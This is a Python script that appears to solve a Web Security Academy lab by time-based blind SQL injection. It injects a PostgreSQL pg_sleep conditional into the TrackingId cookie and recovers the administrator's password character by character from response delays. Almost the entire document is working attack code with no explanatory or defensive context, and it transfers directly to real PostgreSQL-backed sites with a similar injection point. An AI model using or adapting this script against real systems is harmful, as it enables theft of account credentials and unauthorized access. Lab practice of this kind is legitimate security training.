#!/usr/bin/python3

import requests
import string

URL = "https://accd1f0d1fbb220ac0cc452500e80024.web-security-academy.net/"

session = requests.Session()
response = session.get(URL)

TrackingId = session.cookies.get_dict()['TrackingId']
SessionCookie = session.cookies.get_dict()['session']

chars=string.ascii_letters+string.digits
index = 1

password=""

while(index != 21):
	for char in chars:
		r = requests.get(URL, cookies={
		"session": SessionCookie,
		"TrackingId": f"{TrackingId}' || (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),{index},1)='{char}') THEN pg_sleep(10) ELSE pg_sleep(0) END)--"
		})
		if r.elapsed.total_seconds() > 10:
			password=password+char
			index=index+1
			print(password)

